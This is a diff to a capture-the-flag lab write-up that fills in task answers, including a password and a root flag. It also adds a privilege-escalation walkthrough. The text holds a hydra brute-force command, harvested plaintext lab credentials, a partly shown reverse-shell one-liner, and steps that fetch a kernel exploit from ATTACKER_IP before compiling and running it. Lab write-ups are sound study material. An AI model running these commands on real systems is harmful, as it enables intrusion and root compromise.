@@ -26,11 +26,11 @@ Date: 2026-05-26
 	- *InvincibleHack3r*
 ### Task 2
 1. What's their new password?
-	- *...*
+	- *secret1!*
 2. What service can you find on port *55007*?
 	- *pop3*
 3. What can you find on the service?
-	- *...*
+	- *emails*
 4. Who can break Boris' codes?
 	- *Natalya*
 
@@ -50,7 +50,7 @@ Date: 2026-05-26
 1. What's the kernel version?
 	- *xenia*
 2. What is the root flag?
-	- *doak*
+	- *568628e0d993b1973adc718237da6e93*
 
 ---
 # Preparation
@@ -115,8 +115,6 @@ hydra -l boris -P /usr/share/wordlists/rockyou.txt -s 55007 10.80.140.6 pop3 -f 
 Password : `secret1!`
 
 The mail service allows us to exfiltrate other users.
-
-mariel
 ## Other users
 ```
 USER: XENIA
@@ -124,9 +122,6 @@ PASSWORD: RCP90rulez!
 
 USER: Natalya
 PASSWORD: bird
-
-USER: ALEC
-PASSWORD: ....
 
 USER: ADMIN)
 PASSWORD: xWinter1995x!
@@ -148,3 +143,25 @@ python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STRE
 ```
 
 ## Root access
+An old exploit can be used to run privilege escalation because of the kernel version.
+
+1. Download script
+	```bash
+	searchsploit -m linux/local/37292.c
+	```
+2. Change `gcc` to `cc` in `lib = system("gcc ....`
+3. Run temporary python server (ideally through a proxy when practical)
+	```bash
+	python3 -m http.server 80
+	```
+4. Compile and execute on reverse shell
+	```BASH
+	cd /tmp
+	wget http://ATTACKER_IP/37292.c
+	cc 37292.c -o script
+	chmod +x script
+	./script
+	```
+5. Navigate to root folder for flag.txt
+
+With that, Alec Trevelyan has been stoped!
